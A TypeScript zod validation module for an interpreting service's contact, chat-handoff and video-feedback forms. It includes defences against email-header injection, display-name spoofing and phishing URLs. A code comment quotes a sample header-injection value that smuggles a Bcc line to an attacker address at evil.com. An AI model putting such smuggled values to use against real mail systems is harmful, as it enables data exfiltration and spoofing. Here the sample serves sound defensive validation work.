import { z } from "zod";

// Reject CR/LF/NUL — blocks email-header injection in name/email fields.
const NoHeaderInjection = z
  .string()
  .refine((s) => !/[\r\n\x00]/.test(s), { message: "Invalid characters" });

// Stricter for display-name fields used in email subject/From: also reject
// angle-bracket lookalikes (ASCII + Unicode variants), quotes, and the
// RFC 2047 encoded-word start sequence `=?` to prevent visually-misleading
// subject lines (e.g. `Resend Billing <support@...>` injected via the name
// field, or the encoded-word equivalent `=?UTF-8?B?<base64 of same>?=`
// which decodes at display time in admin's mail client). NFKC normalize
// first so fullwidth `＜＞` decomposes to ASCII `<>` and gets caught. Math
// angle `⟨⟩`, CJK `〈〉`, and guillemets `‹›«»` are distinct codepoints
// (not NFKC-equivalent to ASCII) so blocked explicitly. `=?` is a literal
// substring check because `=` and `?` in isolation are fine — only their
// digraph initiates an encoded-word.
const SafeDisplayName = z
  .string()
  .transform((s) => s.normalize("NFKC"))
  .refine(
    (s) => !/[\r\n\x00<>"⟨⟩〈〉〈〉‹›«»]/.test(s) && !s.includes("=?"),
    { message: "Invalid characters" }
  );

// Pipe order: length cap runs BEFORE the refinement so a multi-MB hostile
// payload doesn't get regex-scanned in full before length is enforced.
const Email = z.string().max(254).pipe(NoHeaderInjection).pipe(z.email());
const SafeName = z.string().max(100).pipe(SafeDisplayName).pipe(z.string().trim().min(1));

// Honeypot field — humans leave it empty; bots fill every input.
// Accept any string so the route can silently 200 on non-empty values
// rather than 400'ing (which would let bots detect+tune around the trap).
const Honeypot = z.string().max(1000).optional();

// The on-page form only offers four enum values, but other integrations
// (cached page versions, partner referrals, future internal tools) may
// post custom enquiry_type values. Accept any short non-empty string so
// a regression to the original behaviour ("any string, labelled as
// enquiryLabels[v] || v") doesn't 400 legitimate non-form submitters.
// Length capped to bound subject-line and email-text growth.
const EnquiryType = z.string().trim().min(1).max(50);

// ----------------------------------------------------------------------
// Type-specific contact-form field groups
//
// Each enquiry type asks for the structured details PI staff need to give
// a tailored response on first reply:
//   - Organiser: drives a tailored quote (no bespoke quote without these).
//   - Deaf community: matches the question to a specific event + access need.
//   - Interpreter: speeds the roster / mentoring conversation along.
//
// All fields are OPTIONAL on the schema. The client form makes the
// relevant subset visible per type and the server accepts whatever lands.
// Length caps bound the email body; enums constrain choice fields so the
// route can rely on a finite set when formatting.
// ----------------------------------------------------------------------

const ShortText = z.string().trim().max(200);
const LongText  = z.string().trim().max(500);

// --- Event Organiser fields (quote discovery) ---
const EventType = z.enum([
  "concert", "sport", "theatre", "comedy", "festival",
  "awards", "corporate", "other",
]);
const AudienceSize = z.enum([
  "under_500", "500_to_2k", "2k_to_10k", "10k_to_50k", "over_50k", "not_sure",
]);
const EventFormat = z.enum([
  "single_show", "multi_night", "festival_weekend", "one_off", "other",
]);
const LanguageNeeded = z.enum(["bsl", "isl", "both", "not_sure"]);
const LeadTime = z.enum(["under_2_weeks", "2_to_6_weeks", "over_6_weeks"]);

const OrganiserFields = z.object({
  event_name:           ShortText.optional(),
  event_type:           EventType.optional(),
  venue:                ShortText.optional(),
  city:                 ShortText.optional(),
  event_dates:          ShortText.optional(),
  audience_size:        AudienceSize.optional(),
  event_format:         EventFormat.optional(),
  language_needed:      LanguageNeeded.optional(),
  other_access_needs:   LongText.optional(),
  lead_time:            LeadTime.optional(),
});

// --- Deaf community member fields ---
const LanguagePreference = z.enum(["bsl", "isl", "either"]);
const ContactedVenue = z.enum(["yes", "no", "not_sure"]);

const DeafCommunityFields = z.object({
  event_for_access:     ShortText.optional(),
  event_date:           ShortText.optional(),
  language_preference:  LanguagePreference.optional(),
  specific_access_need: LongText.optional(),
  contacted_venue:      ContactedVenue.optional(),
});

// --- Interpreter fields (recruitment / mentoring) ---
const NrcpdStatus = z.enum(["tsli", "rsli", "tslt", "not_registered", "other"]);
const YearsExperience = z.enum(["under_2", "2_to_5", "5_to_10", "over_10"]);
const InterpreterLanguage = z.enum(["bsl", "isl"]);
const Specialism = z.enum([
  "theatre", "festival", "music", "sport", "comedy",
  "awards", "conference", "education",
]);
const InterpreterGoal = z.enum([
  "ad_hoc", "regular_roster", "mentoring", "shadowing", "other",
]);

const InterpreterFields = z.object({
  nrcpd_status:         NrcpdStatus.optional(),
  languages:            z.array(InterpreterLanguage).max(2).optional(),
  years_experience:     YearsExperience.optional(),
  specialisms:          z.array(Specialism).max(8).optional(),
  region:               ShortText.optional(),
  looking_for:          z.array(InterpreterGoal).max(5).optional(),
});

export const ContactSchema = z.object({
  name: SafeName,
  email: Email,
  message: z.string().max(5000).pipe(z.string().trim().min(1)),
  enquiry_type: EnquiryType,
  urgent: z.boolean().optional(),
  consent: z.boolean().optional(),
  website: Honeypot,
}).extend(OrganiserFields.shape)
  .extend(DeafCommunityFields.shape)
  .extend(InterpreterFields.shape);

// Re-exported so the route can use them when formatting the email body.
export const CONTACT_FIELD_GROUPS = {
  organiser: OrganiserFields.keyof().options,
  "deaf-community": DeafCommunityFields.keyof().options,
  interpreter: InterpreterFields.keyof().options,
} as const;

// Human-readable labels for the structured-field email rendering and the
// form UI. Keep here so server and client stay in sync.
export const FIELD_LABELS: Record<string, string> = {
  // Organiser
  event_name: "Event name",
  event_type: "Event type",
  venue: "Venue",
  city: "City",
  event_dates: "Date(s)",
  audience_size: "Expected audience size",
  event_format: "Format",
  language_needed: "Language needed",
  other_access_needs: "Other access needs",
  lead_time: "Lead time",
  // Deaf community
  event_for_access: "Event you want access to",
  event_date: "Date of event",
  language_preference: "Language preference",
  specific_access_need: "Specific access need",
  contacted_venue: "Contacted venue yet?",
  // Interpreter
  nrcpd_status: "NRCPD status",
  languages: "Language(s)",
  years_experience: "Years experience",
  specialisms: "Specialisms",
  region: "Region",
  looking_for: "Looking for",
};

// Human-readable mapping of enum values back to natural text for emails.
export const VALUE_LABELS: Record<string, string> = {
  // Event type
  concert: "Concert", sport: "Sport", theatre: "Theatre", comedy: "Comedy",
  festival: "Festival", awards: "Awards", corporate: "Corporate", other: "Other",
  // Audience size
  under_500: "< 500", "500_to_2k": "500 – 2,000", "2k_to_10k": "2,000 – 10,000",
  "10k_to_50k": "10,000 – 50,000", over_50k: "50,000+", not_sure: "Not sure",
  // Event format
  single_show: "Single show", multi_night: "Multi-night run",
  festival_weekend: "Festival weekend", one_off: "One-off",
  // Language needed / preference
  bsl: "BSL", isl: "ISL", both: "Both BSL and ISL", either: "Either",
  // Lead time
  under_2_weeks: "Less than 2 weeks", "2_to_6_weeks": "2 – 6 weeks",
  over_6_weeks: "6+ weeks",
  // Contacted venue
  yes: "Yes", no: "No",
  // NRCPD
  tsli: "TSLI (Trainee)", rsli: "RSLI (Registered)",
  tslt: "TSLT (Translator)", not_registered: "Not registered",
  // Years experience
  under_2: "Under 2 years", "2_to_5": "2 – 5 years",
  "5_to_10": "5 – 10 years", over_10: "10+ years",
  // Specialisms (lowercased keys, capitalised for display)
  music: "Music", conference: "Conference", education: "Education",
  // Interpreter goals
  ad_hoc: "Ad-hoc gigs", regular_roster: "Regular roster",
  mentoring: "Mentoring", shadowing: "Shadowing",
};

export const ChatHandoffSchema = z.object({
  name: SafeName,
  email: Email,
  message: z.string().max(5000).pipe(z.string().trim().min(1)),
  // Enquiry type lets the handoff route apply the same structured-email
  // formatting as the contact form for organiser / deaf / interpreter
  // routes — staff get a consistent brief regardless of channel.
  enquiry_type: EnquiryType.optional(),
  summary: z
    .object({
      // `topic` is interpolated into the email subject line — same CRLF
      // defence-in-depth `name`/`email` get. Without it, an attacker
      // submitting `topic: "Quote request\r\nBcc: exfil@evil.com"` could
      // attempt SMTP header injection if Resend's downstream sanitisation
      // ever regresses or the transport changes.
      topic: z.string().max(200).pipe(NoHeaderInjection).optional(),
      tried: z.string().max(2000).optional(),
      question: z.string().max(2000).optional(),
    })
    .optional(),
  transcript: z
    .array(
      z.object({
        role: z.enum(["user", "assistant"]),
        // 30000 chars (~7500 words) is generous for one chat turn — a long
        // signed-explainer reply with embedded catalogue listing and 3-para
        // context can plausibly approach 10000. Bumped from 10000 to avoid
        // 400-rejecting legitimate handoffs and silently dropping them.
        content: z.string().max(30000),
      })
    )
    .max(100)
    .optional(),
  website: Honeypot,
}).extend(OrganiserFields.shape)
  .extend(DeafCommunityFields.shape)
  .extend(InterpreterFields.shape);

// pi-feedback-uploads stores videos in Vercel Blob; returned URL host is
// <tenant>.public.blob.vercel-storage.com. The .public.blob.vercel-storage.com
// domain is multi-tenant (any Vercel customer can publish there), so the
// host-suffix check alone lets an attacker upload phishing content to their
// own tenant and submit that URL — bypassing the A-H4 fix. Lock down to the
// upload service's KNOWN path pattern: `/feedback/<ISO-timestamp>-<8 hex>.<ext>`
// (see pi-feedback-uploads/api/upload.js line 142, plus Vercel Blob's optional
// random-suffix appended after the extension).
const ALLOWED_UPLOAD_HOSTS = ["pi-feedback-uploads.vercel.app"];
const ALLOWED_UPLOAD_SUFFIXES = [".public.blob.vercel-storage.com"];
const UPLOAD_PATH_PATTERN =
  /^\/feedback\/\d{4}-\d{2}-\d{2}T\d{2}-\d{2}-\d{2}-\d{3}Z-[a-f0-9]{8}\.(mp4|mov|webm)(-[A-Za-z0-9]+)?$/;

export const VideoFeedbackSchema = z.object({
  url: z
    .url()
    .refine(
      (url) => {
        try {
          const u = new URL(url);
          if (u.protocol !== "https:") return false;
          // Host gate.
          const hostOk =
            ALLOWED_UPLOAD_HOSTS.includes(u.hostname) ||
            ALLOWED_UPLOAD_SUFFIXES.some((s) => u.hostname.endsWith(s));
          if (!hostOk) return false;
          // Path gate — restricts the multi-tenant Vercel Blob domain to
          // URLs that match the upload service's exact filename template.
          // An attacker would have to (a) own a Vercel tenant AND (b) be
          // able to upload at this exact path pattern, narrowing the
          // phishing-via-trusted-domain vector substantially.
          return UPLOAD_PATH_PATTERN.test(u.pathname);
        } catch {
          return false;
        }
      },
      { message: "URL must be on the allowlisted upload domain" }
    ),
});

// UIMessage shape from `ai` package: { role: 'user'|'assistant'|'system',
// parts: Array<{type: string, ...}> }. We validate just enough that the
// route's downstream `messages.find(m => m.role === ...)` and
// `lastUser.parts.filter(...)` can't crash on malformed input (null
// element, missing parts, etc.). `parts` items are kept as z.unknown()
// because the AI SDK has many part shapes (text, file, tool-call, …) —
// convertToModelMessages handles the rest.
const UIMessagePart = z.object({ type: z.string() }).passthrough();
const UIMessageLike = z
  .object({
    role: z.enum(["user", "assistant", "system"]),
    parts: z.array(UIMessagePart).max(200),
  })
  .passthrough();

export const ChatBodySchema = z.object({
  messages: z.array(UIMessageLike).min(1).max(50),
  audience: z
    .enum(["deaf", "organiser", "interpreter", "skipped"])
    .nullable()
    .optional(),
});

// Render a single structured field as `Label: value`. Returns null when
// the value is absent so the email body stays compact (no empty rows).
// Arrays are joined with commas after each element is translated through
// VALUE_LABELS for human-readable rendering.
function renderField(key: string, value: unknown): string | null {
  if (value == null || value === "") return null;
  const label = FIELD_LABELS[key] ?? key;
  if (Array.isArray(value)) {
    if (value.length === 0) return null;
    const rendered = value
      .map((v) => VALUE_LABELS[String(v)] ?? String(v))
      .join(", ");
    return `${label}: ${rendered}`;
  }
  const v = String(value);
  return `${label}: ${VALUE_LABELS[v] ?? v}`;
}

// Render the structured-field block for a given enquiry type. Returns an
// empty array when the type isn't one of the structured ones (e.g. "other")
// or when no relevant fields were submitted, so the caller can decide
// whether to render a section header.
export function renderStructuredFields(
  data: Record<string, unknown>,
  enquiryType: string
): string[] {
  const fields =
    CONTACT_FIELD_GROUPS[enquiryType as keyof typeof CONTACT_FIELD_GROUPS];
  if (!fields) return [];
  const lines: string[] = [];
  for (const key of fields) {
    const rendered = renderField(key, data[key]);
    if (rendered) lines.push(rendered);
  }
  return lines;
}

// Section headers shown in the email body per enquiry type when the
// structured block is non-empty. Used by both /api/contact and
// /api/chat-handoff so the email layout is consistent.
export const SECTION_HEADERS: Record<string, string> = {
  organiser: "EVENT DETAILS",
  "deaf-community": "ACCESS NEEDS",
  interpreter: "INTERPRETER PROFILE",
};

export function escapeHtml(s: string): string {
  return s.replace(
    /[&<>"']/g,
    (c) =>
      ({
        "&": "&amp;",
        "<": "&lt;",
        ">": "&gt;",
        '"': "&quot;",
        "'": "&#39;",
      })[c]!
  );
}
